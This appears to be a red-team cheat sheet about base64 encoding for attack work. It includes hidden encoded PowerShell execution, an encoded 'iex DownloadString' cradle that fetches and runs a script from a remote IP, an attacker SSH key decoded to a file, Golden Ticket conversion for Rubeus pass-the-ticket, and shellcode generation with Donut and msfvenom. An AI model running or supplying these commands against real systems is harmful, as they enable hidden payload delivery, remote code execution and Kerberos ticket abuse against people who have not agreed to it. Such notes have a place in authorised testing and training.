### powershell -w hidden -enc 
```
powershell -w hidden -enc 
```

```
base64 -w0 <filename>
echo "" | base64 -d > Hell0.txt

echo "c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFDOU0vaUlHejRKaHRWdDMxNVl4Qk9jNXZueEZTYnYvY014dTh1bUdRNTdFOHp0dm5mQlpVSmtjaGZVQlhkcTRyQVJyWHZPVVlpK25PQ1plTTFTQlMrTFI2RUlZRnNJVStvOG5nbi8rYko3WlViZHBuUit6TTR4R2VPYlBpcFZWaVVrdS9uTGl0VnZqTFdGSHpDVTRVajgxMEhsRDUwNE85QlFpOXdaNHIzSG04U3FtNDE1OE5oa1RLTzNhZTZ1UktzWCsyU3o3WmUwWm1NZDB5c3NpV2F1MlN3M1JLZXR4RVN5V3VLcXRUWlplM05xR1J3RDFLd3Z1RXArNUxhUVJRaXRDQlJqaEl5Rktsc1I2S1ovMFZMK2RoSDVObzBPSUZXcy9jSFErYkZVZUY2dnVGcjNDT3BsOStyQVBSaDJwdXV6Ni9IY3BSUVdLOGtUc0UrTEZRM2ogcm9vdEBrYWxpCg==" | base64 -d > ssh.txt
```

# Converting To ASCII Format
```
$OriginalCommand = "aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBj" ;
[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($OriginalCommand));
[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($OriginalCommand)) | Out-File -Encoding "ASCII" base64_out.txt;
```



# Convert to Unicode As Base64 Format
```
$OriginalCommand = "iex (New-Object Net.WebClient).DownloadString('http://10.8.0.166:80/download/file.ps1')"
[System.Convert]::ToBase64String([System.Text.Encoding]::unicode.GetBytes($OriginalCommand))
```



# Decode Base64 Formation to Plaintext 
```
$Encode="aQBlAHgAIAAoAE4AZQB3AC0ATw"
$DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Encode));$DecodedText
[System.Text.Encoding]::unicode.GetString([System.Convert]::FromBase64String(""))
```


### Convert kirbi Ticket to Base64

```
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\NyaMeeEain\Desktop\Golden-Ticket.kirbi")) 
Rubeus ptt /ticket:[...snip...]
```

```
#!/usr/bin/env python
import base64
decode = raw_input (" Enter Your Encoded Data to be decode: ")
output = base64.b64decode(decode)
print (output)
f = open('base64_out.txt', 'w')
f.write(output)
f.close()
```

### Donut
Donut is a shellcode generation tool that creates position-independant shellcode payloads from .NET Assemblies. This shellcode may be used to inject the Assembly into arbitrary Windows processes.
```
donut.exe -f Downloads\GruntStager.exe -o D:\Tools\GruntStager.bin
[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\NyaMeeEain\Desktop\shellcode.bin"))

```

### From Linux
```
msfvenom -a x64 --platform windows/x64/exec CMD=calc.exe -f raw > shellcode.bin
xxd -i shellcode.bin 
cat shellcode.bin |base64 -w 0
```


### File to Base64 
```
[convert]::ToBase64String((Get-Content C:\Users\NyaMeeEain\Desktop\MeMe.exe -Encoding byte))
```
